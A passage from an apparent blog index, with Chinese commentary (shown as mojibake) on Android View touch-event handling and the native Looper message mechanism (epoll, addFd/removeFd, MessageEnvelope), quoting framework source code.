boolean performLongClick(float x, float y) &#123; mLongClickX = x; mLongClickY = y; final boolean handled = performLongClick(); mLongClickX = Float.NaN; mLongClickY = Float.NaN; return handled;&#125; 123public boolean performLongClick() &#123; return performLongClickInternal(mLongClickX, mLongClickY);&#125; 1234567891011121314151617private boolean performLongClickInternal(float x, float y) &#123; sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_LONG_CLICKED); boolean handled = false; final ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnLongClickListener != null) &#123; handled = li.mOnLongClickListener.onLongClick(View.this); &#125; if (!handled) &#123; final boolean isAnchored = !Float.isNaN(x) &amp;&amp; !Float.isNaN(y); handled = isAnchored ? showContextMenu(x, y) : showContextMenu(); &#125; if (handled) &#123; performHapticFeedback(HapticFeedbackConstants.LONG_PRESS); &#125; return handled;&#125; ç¬¬5-8è¡Œæ˜¯ä¸Žä¹‹å‰onTouchEvent()æ–¹æ³•ä¸­ç±»ä¼¼çš„å…³äºŽæ˜¯å¦æ³¨å†Œäº†ç›‘å¬å™¨çš„åˆ¤æ–­ï¼Œå¦‚æžœæ³¨å†Œäº†ç›‘å¬å™¨ï¼Œé‚£ä¹ˆä¼˜å…ˆä½¿ç”¨ç›‘å¬å™¨çš„onLongClick()æ–¹æ³•æ¥å¤„ç†é•¿è¿‘äº‹ä»¶ï¼Œå¦‚æžœæ²¡æœ‰ç›‘å¬å™¨æˆåŠŸå¤„ç†äº‹ä»¶ï¼Œé‚£ä¹ˆä¼šå…ˆåˆ¤æ–­é•¿æŒ‰æ˜¯å¦æœ‰é”šç‚¹ï¼Œå†æ ¹æ®é”šç‚¹çš„å­˜åœ¨æ€§è°ƒç”¨showContextMenu()æ˜¾ç¤ºå¯èƒ½å­˜åœ¨çš„ä¸Šä¸‹æ–‡èœå•ã€‚ 13è¡Œåˆ¤æ–­å¦‚æžœå½“å‰æ–¹æ³•æˆåŠŸæ¶ˆè€—äº†é•¿æŒ‰äº‹ä»¶ï¼Œè°ƒç”¨performHapticFeedback()æ–¹æ³•æ˜¾ç¤ºä¸€ä¸ªè§¦è§‰çš„åé¦ˆã€‚ case MotionEvent.ACTION_MOVE:è§¦æ‘¸ç‚¹å‘ç”Ÿäº†ç§»åŠ¨ 1234567891011drawableHotspotChanged(x, y);if (!pointInView(x, y, mTouchSlop)) &#123; removeTapCallback(); if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; removeLongPressCallback(); setPressed(false); &#125;&#125;break; ç¬¬1è¡Œè°ƒç”¨äº†drawableHotspotChanged()é€šçŸ¥å¯èƒ½å­˜åœ¨çš„å­Viewæˆ–drawableè§¦æ‘¸ç‚¹å‘ç”Ÿäº†ç§»åŠ¨ã€‚ ç¬¬3è¡Œæ£€æµ‹ç”±äºŽç§»åŠ¨ï¼Œè§¦æ‘¸ç‚¹æ˜¯å¦ç§»å‡ºäº†view+slopæ‰©å±•å‡ºçš„èŒƒå›´ï¼Œslopçš„å­˜åœ¨æ˜¯ä¸ºäº†ä¿è¯åœ¨æŒ‰ä¸‹åŽè½»å¾®ç§»å‡ºç‚¹å‡»åŒºåŸŸçš„æƒ…å†µä¸‹èƒ½æ­£å¸¸åˆ¤æ–­ç‚¹å‡»ï¼š 1234public boolean pointInView(float localX, float localY, float slop) &#123; return localX &gt;= -slop &amp;&amp; localY &gt;= -slop &amp;&amp; localX &lt; ((mRight - mLeft) + slop) &amp;&amp; localY &lt; ((mBottom - mTop) + slop);&#125; å¦‚æžœç§»å‡ºäº†è¿™ä¸ªèŒƒå›´ï¼Œé¦–å…ˆç¬¬4è¡Œè°ƒç”¨removeTapCall()ï¼š 123456private void removeTapCallback() &#123; if (mPendingCheckForTap != null) &#123; mPrivateFlags &amp;= ~PFLAG_PREPRESSED; removeCallbacks(mPendingCheckForTap); &#125;&#125; å…ˆå–æ¶ˆäº†é¢„æŒ‰ä¸‹çŠ¶æ€çš„flagï¼Œå†è°ƒç”¨removeCallbacksï¼š 123456789101112public boolean removeCallbacks(Runnable action) &#123; if (action != null) &#123; final AttachInfo attachInfo = mAttachInfo; if (attachInfo != null) &#123; attachInfo.mHandler.removeCallbacks(action); attachInfo.mViewRootImpl.mChoreographer.removeCallbacks( Choreographer.CALLBACK_ANIMATION, action, null); &#125; getRunQueue().removeCallbacks(action); &#125; return true;&#125; ä»Žæ¶ˆæ¯é˜Ÿåˆ—ä¸­ç§»å‡ºæˆ‘ä»¬æ£€æµ‹å•å‡»äº‹ä»¶çš„æ¶ˆæ¯ï¼Œè¿™æ ·ï¼Œç”±äºŽè§¦æ‘¸ç‚¹ç§»åŠ¨å‡ºäº†å½“å‰viewï¼Œå¦‚æžœåœ¨æ»šåŠ¨å®¹å™¨ä¸­çš„æƒ…å†µä¸‹ï¼Œé•¿æŒ‰çš„æ£€æµ‹å°±ä¸ä¼šè¿›è¡Œï¼ˆå› mPendingCheckForTapæ¶ˆæ¯è¢«ç§»å‡ºæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ã€‚ 12345if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; removeLongPressCallback(); setPressed(false);&#125; å¦‚æžœpressedæ ‡å¿—ä½ä¸º1ï¼Œé‚£ä¹ˆå°±å–æ¶ˆæ¶ˆæ¯é˜Ÿåˆ—ä¸­é•¿æŒ‰è§¦å‘æ¶ˆæ¯ï¼ŒåŒæ—¶åŽ»é™¤pressedæ ‡å¿—ä½ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œåªè¦è§¦æ‘¸ç‚¹ç§»åŠ¨å‡ºäº†å½“å‰viewï¼Œé‚£ä¹ˆæ‰€æœ‰çš„ç‚¹å‡»ã€é•¿æŒ‰äº‹ä»¶éƒ½ä¸ä¼šè§¦å‘ï¼Œä½†æ˜¯åªè¦ç§»åŠ¨è¿˜åœ¨view+slotèŒƒå›´å†…ï¼Œé‚£ä¹ˆç‚¹å‡»é•¿æŒ‰äº‹ä»¶è¿˜æ˜¯ä¼šè¢«è§¦å‘çš„ã€‚ case MotionEvent.ACTION_UP:æŠ¬èµ·æ‰‹æŒ‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849boolean prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != 0;if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0 || prepressed) &#123; // å¦‚æžœæœ‰prepressedæˆ–pressedæ ‡å¿— boolean focusTaken = false; if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) &#123; // å¯ä»¥èŽ·å¾—ç„¦ç‚¹ä½†æ²¡æœ‰èŽ·å¾— // è¯·æ±‚èŽ·å–ç„¦ç‚¹ focusTaken = requestFocus(); &#125; if (prepressed) &#123; // prepressedçŠ¶æ€è¡¨ç¤ºæ»šåŠ¨å®¹å™¨ä¸­çš„ç‚¹å‡»æ£€æµ‹è¿˜æ²¡æœ‰è¢«æ¶ˆæ¯é˜Ÿåˆ—æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™å¦‚æžœæŠ¬èµ·æ‰‹æŒ‡è¯´æ˜Žæ˜¯ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œè°ƒç”¨setPressedæ˜¾ç¤ºåé¦ˆ setPressed(true, x, y); &#125; if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) &#123; // æ²¡æœ‰åˆ°è¾¾æ‰§è¡Œé•¿æŒ‰è§¦å‘æ¶ˆæ¯çš„æ—¶é—´å°±æŠ¬èµ·äº†æ‰‹æŒ‡ï¼Œè¯´æ˜Žè¿™æ˜¯ä¸€ä¸ªå•å‡»äº‹ä»¶ï¼Œç§»é™¤é•¿æŒ‰è§¦å‘æ¶ˆæ¯ removeLongPressCallback(); if (!focusTaken) &#123; // å½“å½“å‰viewæ²¡æœ‰èŽ·å–ç„¦ç‚¹æ—¶æ‰èƒ½è§¦å‘ç‚¹å‡»äº‹ä»¶ï¼Œè¯´æ˜Žä¸€ä¸ªå¯ä»¥èŽ·å–ç„¦ç‚¹çš„viewæ˜¯æ— æ³•è§¦å‘ç‚¹å‡»äº‹ä»¶çš„ if (mPerformClick == null) &#123; mPerformClick = new PerformClick(); &#125; // ä½¿ç”¨postæ¥å°†performClickåŠ¨ä½œæ”¾å…¥é˜Ÿåˆ—ä¸­æ‰§è¡Œæ¥ä¿è¯å…¶ä»–viewè§†è§‰ä¸Šçš„å˜åŒ–å¯ä»¥åœ¨ç‚¹å‡»äº‹ä»¶è¢«è§¦å‘ä¹‹å‰è¢«çœ‹åˆ° if (!post(mPerformClick)) &#123; // å¦‚æžœpostæ²¡æœ‰æˆåŠŸï¼Œåˆ™ç›´æŽ¥æ‰§è¡Œ performClick(); &#125; &#125; &#125; // UnsetPressedStateä¸ºRunnableæ¶ˆæ¯ï¼Œç”¨äºŽå–æ¶ˆviewçš„prepressedæˆ–pressedçŠ¶æ€ if (mUnsetPressedState == null) &#123; mUnsetPressedState = new UnsetPressedState(); &#125; if (prepressed) &#123; // å–æ¶ˆprepressedçŠ¶æ€ postDelayed(mUnsetPressedState, ViewConfiguration.getPressedStateDuration()); &#125; else if (!post(mUnsetPressedState)) &#123; // å–æ¶ˆpressedçŠ¶æ€ mUnsetPressedState.run(); &#125; // æ¸…é™¤å•å‡»æ£€æµ‹æ¶ˆæ¯ removeTapCallback();&#125;mIgnoreNextUpEvent = false;break; å¯ä»¥çœ‹åˆ°upæ—¶ï¼Œæ‰æ˜¯å•å‡»äº‹ä»¶çœŸæ­£è§¦å‘çš„åœ°æ–¹ï¼Œå¦‚æžœè¿™ä¸ªviewå¯ä»¥èŽ·å¾—ç„¦ç‚¹ï¼Œé‚£ä¹ˆä¼šä¼˜å…ˆå¤„ç†ç„¦ç‚¹èŽ·å–ï¼Œè€Œä¸ä¼šè§¦å‘ç‚¹å‡»äº‹ä»¶ã€‚ 1234567891011121314public boolean performClick() &#123; final boolean result; final ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnClickListener != null) &#123; playSoundEffect(SoundEffectConstants.CLICK); li.mOnClickListener.onClick(this); result = true; &#125; else &#123; result = false; &#125; sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED); return result;&#125; ç›¸ä¼¼çš„æ–¹æ³•ï¼Œæ£€æµ‹äº†æ˜¯å¦æœ‰ç›‘å¬çš„å­˜åœ¨å¹¶æ‰§è¡Œï¼Œæœ€åŽç»™è¾…åŠ©åŠŸèƒ½é€‰é¡¹å‘é€ä¸€æ¡æ¶ˆæ¯ã€‚ case MotionEvent.ACTION_CANCEL:å–æ¶ˆè¿™ä¸€ç³»åˆ—è§¦æ‘¸åŠ¨ä½œ 12345678case MotionEvent.ACTION_CANCEL:setPressed(false);removeTapCallback();removeLongPressCallback();mInContextButtonPress = false;mHasPerformedLongPress = false;mIgnoreNextUpEvent = false;break; æ¸…é™¤æ‰€æœ‰çš„çŠ¶æ€ã€‚ å°ç»“Viewé»˜è®¤çš„onTouchEvent()æ–¹æ³•å¤„ç†äº†ä¸€ç³»åˆ—çš„è§¦æ‘¸äº‹ä»¶ï¼Œ åˆ¤æ–­æ˜¯å¦è§¦å‘å•å‡»ã€é•¿æŒ‰ç­‰ï¼Œå¹¶ä¸”æä¾›äº†é»˜è®¤çš„æŒ‰ä¸‹ã€ç‚¹å‡»ã€é•¿æŒ‰çš„è§†è§‰åé¦ˆã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸‰ï¼‰Nativeå±‚æ¶ˆæ¯æœºåˆ¶]]></title>
    <url>%2F2017%2F11%2F02%2Fandroid_event_3%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰çš„ä¸¤ç¯‡æ–‡ç« è®²è§£äº†javaå±‚æ¶ˆæ¯æœºåˆ¶çš„è¿‡ç¨‹ä»¥åŠä½¿ç”¨ï¼Œä¸­é—´çœç•¥äº†æ¯”è¾ƒå¤šçš„ä»£ç å°±æ˜¯åœ¨nativeå±‚å®žçŽ°çš„æ¶ˆæ¯æœºåˆ¶ä¸­ä½¿ç”¨çš„ã€‚è¿™ç¯‡æ–‡ç« å°±å¯¹è¿™ä¸€éƒ¨åˆ†è¿›è¡Œè®²è§£ã€‚ èµ·ç‚¹æˆ‘ä»¬ä»Žç¬¬ä¸€ç¯‡æ–‡ç« çŸ¥é“ï¼ŒLooper.loop()æ–¹æ³•è¢«è°ƒç”¨åŽï¼Œä¼šå¯åŠ¨ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œè€Œåœ¨è¿™ä¸ªå¾ªçŽ¯ä¸­ï¼Œè°ƒç”¨äº†MessageQueueçš„next()æ–¹æ³•ä»¥èŽ·å–ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼Œè€Œnext()æ–¹æ³•ä¸­ä¼šé¦–å…ˆè°ƒç”¨nativePollOnce()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨åœ¨ä¹‹å‰è¯´è¿‡æ˜¯é˜»å¡žï¼Œè¾¾åˆ°è¶…æ—¶æ—¶é—´æˆ–æœ‰æ–°çš„æ¶ˆæ¯åˆ°è¾¾æ—¶å¾—åˆ°eventFdçš„é€šçŸ¥å†å”¤é†’æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…¶å®žè¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯nativeæ¶ˆæ¯å¤„ç†çš„å¼€å§‹ã€‚ è¿›å…¥Nativeå±‚android_os_MessageQueue_nativePollOnce()12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; 12345678void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; ...&#125; è°ƒç”¨äº†Native Looperçš„pollOnce()æ–¹æ³•ï¼š pollOnce()123inline int pollOnce(int timeoutMillis) &#123; return pollOnce(timeoutMillis, NULL, NULL, NULL);&#125; 12345678910111213141516171819202122232425262728int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123; int result = 0; for (;;) &#123; while (mResponseIndex &lt; mResponses.size()) &#123; const Response&amp; response = mResponses.itemAt(mResponseIndex++); int ident = response.request.ident; if (ident &gt;= 0) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; if (outFd != NULL) *outFd = fd; if (outEvents != NULL) *outEvents = events; if (outData != NULL) *outData = data; return ident; &#125; &#125; if (result != 0) &#123; if (outFd != NULL) *outFd = 0; if (outEvents != NULL) *outEvents = 0; if (outData != NULL) *outData = NULL; return result; &#125; result = pollInner(timeoutMillis); &#125;&#125; æˆ‘ä»¬ä¹‹å‰ç›´æŽ¥è·³è¿‡äº†26è¡Œä¹‹å‰çš„å†…å®¹ï¼ŒçŽ°åœ¨æˆ‘ä»¬è¿˜æ˜¯ä¸èƒ½ç†è§£è¿™ä¸€æ®µçš„æ„ä¹‰ï¼Œä»Žç¨‹åºä¸Šçœ‹ï¼Œæˆ‘ä»¬ä»ŽmResponseå®¹å™¨ä¸­å–å‡ºäº†ä¸€ä¸ªresponseå¹¶æŠŠä»–çš„å†…å®¹æ”¾å…¥äº†ä¼ å…¥çš„åœ°å€å‚æ•°ä¸­è¿”å›žã€‚é¦–å…ˆï¼Œè¿™ä¸ªè°ƒç”¨ä¸­æ²¡æœ‰ä¼ å…¥åœ°å€å‚æ•°ï¼Œå…¶æ¬¡ï¼Œè¿™ä¸ªmResponseæ•°ç»„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æˆ‘ä»¬ç»§ç»­å…ˆå¾€ä¸‹çœ‹ï¼Œä¸‹é¢çš„pollInner()æ–¹æ³•æ¯”è¾ƒé•¿ä¹Ÿæ˜¯nativeæ¶ˆæ¯æœºåˆ¶çš„æ ¸å¿ƒï¼Œæˆ‘ä»¬æ‹†æˆå‡ ä¸ªéƒ¨åˆ†çœ‹ã€‚ pollInner()Request ä¸Ž Response12345678910111213141516171819202122232425262728293031323334 int result = POLL_WAKE; mResponses.clear(); mResponseIndex = 0; mPolling = true; struct epoll_event eventItems[EPOLL_MAX_EVENTS]; int eventCount = epoll_wait(mEpollFd, eventItems, EPOLL_MAX_EVENTS, timeoutMillis); mPolling = false; mLock.lock();... for (int i = 0; i &lt; eventCount; i++) &#123; int fd = eventItems[i].data.fd; uint32_t epollEvents = eventItems[i].events; if (fd == mWakeEventFd) &#123; if (epollEvents &amp; EPOLLIN) &#123; awoken(); &#125; else &#123; ALOGW("Ignoring unexpected epoll events 0x%x on wake event fd.", epollEvents); &#125; &#125; else &#123; ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &gt;= 0) &#123; int events = 0; if (epollEvents &amp; EPOLLIN) events |= EVENT_INPUT; if (epollEvents &amp; EPOLLOUT) events |= EVENT_OUTPUT; if (epollEvents &amp; EPOLLERR) events |= EVENT_ERROR; if (epollEvents &amp; EPOLLHUP) events |= EVENT_HANGUP; pushResponse(events, mRequests.valueAt(requestIndex)); &#125; else &#123; ALOGW("Ignoring unexpected epoll events 0x%x on fd %d that is " "no longer registered.", epollEvents, fd); &#125; &#125; &#125; å½“ç¬¬7è¡Œç³»ç»Ÿè°ƒç”¨epoll_wait()è¿”å›žæ—¶ï¼Œè¯´æ˜Žå› æ³¨å†Œçš„fdæœ‰æ¶ˆæ¯æˆ–è¾¾åˆ°è¶…æ—¶ï¼Œåœ¨ç¬¬11è¡Œå°±å¯¹æ”¶åˆ°çš„å”¤é†’eventsè¿›è¡ŒéåŽ†ï¼Œé¦–å…ˆåˆ¤æ–­æœ‰æ¶ˆæ¯çš„fdæ˜¯ä¸æ˜¯ç”¨äºŽå”¤é†’çš„mWakeEventFdï¼Œå¦‚æžœä¸æ˜¯çš„è¯ï¼Œè¯´æ˜Žæ˜¯ç³»ç»Ÿè°ƒç”¨addFd()æ–¹æ³•è®¾ç½®çš„è‡ªå®šä¹‰fdï¼ˆåŽé¢ä¼šè®²ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸ªäº‹ä»¶ä½œå‡ºå“åº”ã€‚ ç¬¬21åˆ°28è¡Œå°±å¯¹è¿™ä¸ªeventåšå¤„ç†ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬ä»¥è¿™ä¸ªfdä¸ºkeyä»ŽmRequestsä¸­æ‰¾åˆ°ä»–çš„ç´¢å¼•ï¼Œè¿™ä¸ªmRequestsæ˜¯æˆ‘ä»¬åœ¨addFd()æ–¹æ³•ä¸€å¹¶æ³¨å†Œçš„ä»¥fdä¸ºkeyï¼ŒRequestä¸ºvalueçš„æ˜ å°„è¡¨ã€‚æ‰¾åˆ°requestä¹‹åŽï¼Œ28è¡Œè°ƒç”¨pushResponse()æ–¹æ³•åŽ»å»ºç«‹responseï¼š 123456void Looper::pushResponse(int events, const Request&amp; request) &#123; Response response; response.events = events; response.request = request; mResponses.push(response);&#125; çŽ°åœ¨æˆ‘ä»¬è¦å¤„ç†çš„ä»»åŠ¡å·²ç»è¢«å°è£…æˆäº†ä¸€ä¸ªResponseå¯¹è±¡ï¼Œç­‰å¾…è¢«å¤„ç†ï¼Œé‚£ä¹ˆçœŸæ­£çš„å¤„ç†åœ¨å“ªé‡Œå‘¢ï¼Ÿ åœ¨ä¸Šé¢çš„ä»£ç ä¸Žå¤„ç†responseçš„ä»£ç ä¸­é—´å¤¹ç€çš„æ˜¯å¤„ç†MessageEnvelopeçš„ä»£ç ï¼Œæˆ‘ä»¬åŽé¢å†è®²è¿™æ®µï¼ŒçŽ°åœ¨åˆ°å¤„ç†responseçš„ä»£ç ï¼š 1234567891011121314for (size_t i = 0; i &lt; mResponses.size(); i++) &#123; Response&amp; response = mResponses.editItemAt(i); if (response.request.ident == POLL_CALLBACK) &#123; int fd = response.request.fd; int events = response.events; void* data = response.request.data; int callbackResult = response.request.callback-&gt;handleEvent(fd, events, data); if (callbackResult == 0) &#123; removeFd(fd, response.request.seq); &#125; response.request.callback.clear(); result = POLL_CALLBACK; &#125;&#125; éåŽ†æ‰€æœ‰responseå¯¹è±¡ï¼Œå–å‡ºä¹‹å‰æ³¨å†Œçš„requestå¯¹è±¡çš„ä¿¡æ¯ï¼Œç„¶åŽè°ƒç”¨äº†request.callback-&gt;handleEvent()æ–¹æ³•è¿›è¡Œå›žè°ƒï¼Œå¦‚æžœè¯¥å›žè°ƒè¿”å›ž0ï¼Œåˆ™è°ƒç”¨removeFd()æ–¹æ³•å–æ¶ˆè¿™ä¸ªfdçš„æ³¨å†Œã€‚ å†æ¢³ç†ä¸€éè¿™ä¸ªè¿‡ç¨‹ï¼šæ³¨å†Œçš„è‡ªå®šä¹‰fdè¢«æ¶ˆæ¯å”¤é†’ï¼Œä»ŽmRequestsä¸­ä»¥fdä¸ºkeyæ‰¾åˆ°å¯¹åº”çš„æ³¨å†Œå¥½çš„requestå¯¹è±¡ç„¶åŽç”Ÿæˆresponseå¯¹è±¡ï¼Œåœ¨MessageEnvelopå¤„ç†å®Œæ¯•ä¹‹åŽå¤„ç†responseï¼Œè°ƒç”¨requestä¸­çš„callbackçš„handleEvent()æ–¹æ³•ã€‚ é‚£ä¹ˆaddFd()æ³¨å†Œè‡ªå®šä¹‰fdä¸ŽremoveFd()å–æ¶ˆæ³¨å†Œæ˜¯å¦‚ä½•å®žçŽ°çš„å‘¢ï¼Ÿ addFd()12345678910111213141516171819202122232425262728293031323334353637383940414243444546int Looper::addFd(int fd, int ident, int events, const sp&lt;LooperCallback&gt;&amp; callback, void* data) &#123; ... &#123; // acquire lock AutoMutex _l(mLock); Request request; request.fd = fd; request.ident = ident; request.events = events; request.seq = mNextRequestSeq++; request.callback = callback; request.data = data; if (mNextRequestSeq == -1) mNextRequestSeq = 0; // reserve sequence number -1 struct epoll_event eventItem; request.initEventItem(&amp;eventItem); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE("Error adding epoll events for fd %d: %s", fd, strerror(errno)); return -1; &#125; mRequests.add(fd, request); &#125; else &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; if (errno == ENOENT) &#123; epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE("Error modifying or adding epoll events for fd %d: %s", fd, strerror(errno)); return -1; &#125; scheduleEpollRebuildLocked(); &#125; else &#123; ALOGE("Error modifying epoll events for fd %d: %s", fd, strerror(errno)); return -1; &#125; &#125; mRequests.replaceValueAt(requestIndex, request); &#125; &#125; // release lock return 1;&#125; ç¬¬6-13è¡Œä½¿ç”¨ä¼ å…¥çš„å‚æ•°åˆå§‹åŒ–äº†requestå¯¹è±¡ï¼Œç„¶åŽ16è¡Œç”±requestæ¥åˆå§‹åŒ–æ³¨å†Œepollä½¿ç”¨çš„eventã€‚19è¡Œæ ¹æ®mRequests.indexOfKey()æ–¹æ³•å–å‡ºçš„å€¼æ¥åˆ¤æ–­fdæ˜¯å¦å·²ç»æ³¨å†Œï¼Œå¦‚æžœæœªæ³¨å†Œï¼Œåˆ™åœ¨20è¡Œè¿›è¡Œç³»ç»Ÿè°ƒç”¨epoll_ctl()æ³¨å†Œæ–°ç›‘å¬å¹¶åœ¨25è¡Œå°†fdä¸Žrequestå­˜å…¥mRequestï¼Œå¦‚æžœå·²æ³¨å†Œï¼Œåˆ™åœ¨27è¡Œæ›´æ–°æ³¨å†Œå¹¶åœ¨42è¡Œæ›´æ–°requestã€‚ è¿™å°±æ˜¯è‡ªå®šä¹‰fdè®¾ç½®çš„è¿‡ç¨‹ï¼šä¿å­˜requestå¹¶ä½¿ç”¨epoll_ctlç³»ç»Ÿè°ƒç”¨æ³¨å†Œfdçš„ç›‘å¬ã€‚ removeFd()12345678910111213141516171819202122232425int Looper::removeFd(int fd, int seq) &#123; &#123; // acquire lock AutoMutex _l(mLock); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; return 0; &#125; if (seq != -1 &amp;&amp; mRequests.valueAt(requestIndex).seq != seq) &#123; return 0; &#125; mRequests.removeItemsAt(requestIndex); int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_DEL, fd, NULL); if (epollResult &lt; 0) &#123; if (seq != -1 &amp;&amp; (errno == EBADF || errno == ENOENT)) &#123; scheduleEpollRebuildLocked(); &#125; else &#123; ALOGE("Error removing epoll events for fd %d: %s", fd, strerror(errno)); scheduleEpollRebuildLocked(); return -1; &#125; &#125; &#125; // release lock return 1;&#125; è§£é™¤çš„è¿‡ç¨‹ç›¸åï¼Œåœ¨ç¬¬11è¡Œåˆ é™¤mRequestsä¸­çš„é”®å€¼å¯¹ï¼Œç„¶åŽåœ¨ç¬¬13è¡Œç³»ç»Ÿè°ƒç”¨epoll_ctl()è§£é™¤fdçš„epollæ³¨å†Œã€‚ MessageEnvelopæ¶ˆæ¯å¤„ç†ä¹‹å‰è¯´åˆ°ï¼Œåœ¨requestç”Ÿæˆresponseåˆ°responseçš„å¤„ç†ä¸­é—´æœ‰ä¸€æ®µä»£ç æ‰§è¡Œäº†MessageEnvelopæ¶ˆæ¯çš„å¤„ç†ï¼Œè¿™ä¸ªé¡ºåºä¿è¯äº†MessageEnvelopä¼˜å…ˆäºŽfdå¼•èµ·çš„requestçš„å¤„ç†ã€‚ çŽ°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™æ®µä»£ç ï¼š 12345678910111213141516171819202122mNextMessageUptime = LLONG_MAX;while (mMessageEnvelopes.size() != 0) &#123; nsecs_t now = systemTime(SYSTEM_TIME_MONOTONIC); const MessageEnvelope&amp; messageEnvelope = mMessageEnvelopes.itemAt(0); if (messageEnvelope.uptime &lt;= now) &#123; &#123; // obtain handler sp&lt;MessageHandler&gt; handler = messageEnvelope.handler; Message message = messageEnvelope.message; mMessageEnvelopes.removeAt(0); mSendingMessage = true; mLock.unlock(); handler-&gt;handleMessage(message); &#125; // release handler mLock.lock(); mSendingMessage = false; result = POLL_CALLBACK; &#125; else &#123; mNextMessageUptime = messageEnvelope.uptime; break; &#125;&#125; å¯ä»¥çœ‹åˆ°mMessageEnvelopeså®¹å™¨ä¸­å­˜å‚¨äº†æ‰€æœ‰çš„æ¶ˆæ¯ï¼Œç¬¬4è¡Œä»Žé¦–ä½ç½®å–å‡ºä¸€æ¡æ¶ˆæ¯ï¼ŒéšåŽè¿›è¡Œæ—¶é—´åˆ¤æ–­ï¼Œå¦‚æžœæ—¶é—´åˆ°è¾¾ï¼Œå…ˆç§»å‡ºå®¹å™¨ï¼Œä¸Žjavaå±‚æ¯”è¾ƒç›¸ä¼¼éƒ½æ˜¯è°ƒç”¨äº†handlerçš„handleMessage()æ¥è¿›è¡Œæ¶ˆæ¯çš„å¤„ç†ã€‚ é‚£ä¹ˆMessageEnvelopeæ˜¯å¦‚ä½•æ·»åŠ çš„å‘¢ï¼Ÿ Native Looperæä¾›äº†ä¸€å¥—ä¸Žjavaå±‚MessageQueueç±»ä¼¼çš„æ–¹æ³•ï¼Œç”¨äºŽæ·»åŠ MessageEnvelopeï¼š 12345678910111213141516171819202122void Looper::sendMessageAtTime(nsecs_t uptime, const sp&lt;MessageHandler&gt;&amp; handler, const Message&amp; message) &#123; size_t i = 0; &#123; // acquire lock AutoMutex _l(mLock); size_t messageCount = mMessageEnvelopes.size(); while (i &lt; messageCount &amp;&amp; uptime &gt;= mMessageEnvelopes.itemAt(i).uptime) &#123; i += 1; &#125; MessageEnvelope messageEnvelope(uptime, handler, message); mMessageEnvelopes.insertAt(messageEnvelope, i, 1); if (mSendingMessage) &#123; return; &#125; &#125; // release lock if (i == 0) &#123; wake(); &#125;&#125; è¿™æ®µæ·»åŠ MessageEnvelopeçš„ä»£ç ä¸éœ€è¦å¤ªå¤šçš„è§£é‡Šã€‚ å°ç»“çŽ°åœ¨æˆ‘ä»¬çœ‹åˆ°ï¼Œå…¶å®žNativeä¸­çš„æ¶ˆæ¯æœºåˆ¶æœ‰ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€æ–¹é¢æ˜¯é€šè¿‡addFd()æ³¨å†Œçš„è‡ªå®šä¹‰fdè§¦å‘æ¶ˆæ¯å¤„ç†ï¼Œé€šè¿‡mRequestsä¿å­˜çš„requestå¯¹è±¡ä¸­çš„callbackè¿›è¡Œæ¶ˆæ¯å¤„ç†ã€‚å¦ä¸€æ–¹é¢æ˜¯é€šè¿‡ä¸Žjavaå±‚ç±»ä¼¼çš„MessageEnvelopæ¶ˆæ¯å¯¹è±¡è¿›è¡Œå¤„ç†ï¼Œè°ƒç”¨çš„æ˜¯è¯¥å¯¹è±¡handleråŸŸçš„handleMessage()æ–¹æ³•ï¼Œä¸Žjavaå±‚éžå¸¸ç±»ä¼¼ã€‚ä¼˜å…ˆçº§æ˜¯å…ˆå¤„ç†MessageEnvelopå†å¤„ç†requestã€‚ 